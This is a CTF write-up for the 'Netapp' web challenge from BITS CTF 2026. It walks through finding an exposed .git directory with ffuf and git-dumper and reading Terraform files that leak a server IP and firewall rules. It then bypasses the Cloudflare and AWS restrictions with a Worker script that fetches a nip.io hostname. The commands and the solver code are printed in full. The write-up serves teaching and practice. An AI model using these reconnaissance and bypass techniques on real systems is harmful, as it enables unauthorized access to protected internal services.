---
title: "[Web] Netapp"
description: Writeup for "Netapp" from BITS CTF 2026.
date: 2026-02-22 01:00:00 +0900
categories: [CTF, BITS CTF 2026]
tags: [Web]
toc: true
comments: false
---

# Netapp (BITS CTF 2026)

---

- **Name:** Netapp
- **Category:** Web
- **Description:** We think our internal services are protected because we use netapp ðŸ˜˜
- **Difficulty:** â˜…â˜…â˜†â˜†â˜†

---

## TL;DR

Found an exposed `.git` directory containing Terraform code that revealed the EC2 IP (`3.208.18.209`).

The server is protected by two layers â€” Cloudflare firewall and AWS security group â€” but both can be bypassed at once by fetching `http://3.208.18.209.nip.io/` from a **Cloudflare Worker**.

- AWS security group only allows Cloudflare IPs â†’ Worker passes âœ…
- Cloudflare firewall only blocks `bitsctf-2026.hvijay.dev` â†’ `nip.io` domain doesn't match âœ…

---

## Overview

Visiting `https://netapp.bitskrieg.in` shows:

- Web Portal â€” ðŸŸ¢ ONLINE
- Auth Gateway â€” ðŸŸ¢ ONLINE
- flag-service â€” ðŸŸ¡ INTERNAL (VPN only)

**Goal:** reach `flag-service` without a VPN.

---

## Solution

### 1) Recon â€” Exposed `.git` directory

Directory brute-force with `ffuf` found a `.git` directory:

```bash
ffuf -u https://netapp.bitskrieg.in/FUZZ \
  -w wordlist.txt -mc 200,301,302
# [200] /.git/config
# [200] /.git/HEAD
```

Dumped the full repo with `git-dumper`:

```bash
git-dumper https://netapp.bitskrieg.in /tmp/netapp-git
```

Key files found:

```
flag-service/
  â”œâ”€â”€ aws-security-group.tf
  â””â”€â”€ bitsctf-2026-vpn-only.tf
```

---

### 2) Root Cause â€” Terraform Code Analysis

**`aws-security-group.tf`** reveals the EC2 IP and firewall rules:

```hcl
# EC2 IP: 3.208.18.209

resource "aws_security_group" "cf_only_web" {
  ingress {
    from_port   = 80
    # Only allow Cloudflare IP ranges
    cidr_blocks = ["173.245.48.0/20", "103.21.244.0/22", ...]
  }
}
```

**`bitsctf-2026-vpn-only.tf`** reveals the Cloudflare firewall rule:

```hcl
resource "cloudflare_filter" "vpn_access_filter" {
  # Block all requests to bitsctf-2026.hvijay.dev
  body = "(http.host eq \"bitsctf-2026.hvijay.dev\") and (ip.src ne 0.0.0.0)"
}
resource "cloudflare_firewall_rule" "vpn_access_rule" {
  action = "block"
}
```

**Infrastructure summary:**

```
External request
      â”‚
      â–¼
Cloudflare Firewall
  Rule: host = bitsctf-2026.hvijay.dev
        AND ip â‰  0.0.0.0  â†’ BLOCK
      â”‚
      â–¼
AWS EC2 (3.208.18.209)
  Security group: only Cloudflare IPs allowed on 80/443
```

Two layers of protection:
1. Cloudflare blocks all direct external access to the domain
2. AWS only accepts traffic coming from Cloudflare IPs

---

### 3) Failed Bypass Attempts

- Direct access to `https://bitsctf-2026.hvijay.dev` â†’ **403** (Cloudflare firewall)
- Direct access to EC2 IP `http://3.208.18.209` â†’ **Timeout** (AWS security group)
- `X-Forwarded-For: 0.0.0.0` header â†’ **403** (Cloudflare ignores it)
- Cloudflare Worker â†’ fetch EC2 IP directly â†’ **Error 1003** (CF blocks direct IP fetch)
- Cloudflare Worker â†’ fetch domain â†’ **403** (firewall still applies)
- DNS brute-force / CT log search â†’ found subdomains, no flag

---

### 4) Exploit â€” Bypass via `nip.io`

**The key insight:**

`nip.io` is a wildcard DNS service â€” `3.208.18.209.nip.io` resolves to `3.208.18.209`.
It's a domain name (not a raw IP), so Cloudflare's Error 1003 doesn't apply.
And it's not `bitsctf-2026.hvijay.dev`, so the firewall rule doesn't match either.

Running this in **Cloudflare Workers Playground**:

```javascript
export default {
  async fetch(request) {
    const res = await fetch("http://3.208.18.209.nip.io/");
    return res;
  }
};
```

Response:
```
HTTP 200 OK
BITSCTF{...}
```

---

### 5) Why It Works

```
[Cloudflare Workers Playground]
        â”‚
        â”‚ fetch("http://3.208.18.209.nip.io/")
        â–¼
[Cloudflare Firewall]
  host = "3.208.18.209.nip.io"
  â‰  "bitsctf-2026.hvijay.dev"
  â†’ Rule does NOT match â†’ Passes âœ…
        â”‚
        â–¼
[AWS EC2: 3.208.18.209]
  Request source = Cloudflare Worker IP
  â†’ Security group allows it â†’ Passes âœ…
  â†’ Returns flag
```

Both protections are bypassed at the same time:
- **AWS security group** â€” Worker runs on Cloudflare infrastructure, so the IP is allowed
- **Cloudflare firewall** â€” `nip.io` domain doesn't match the block rule

---

## Solver

Run this in [Cloudflare Workers Playground](https://workers.cloudflare.com/playground):

```javascript
export default {
  async fetch(request) {
    const res = await fetch("http://3.208.18.209.nip.io/");
    return res;
  }
};
```
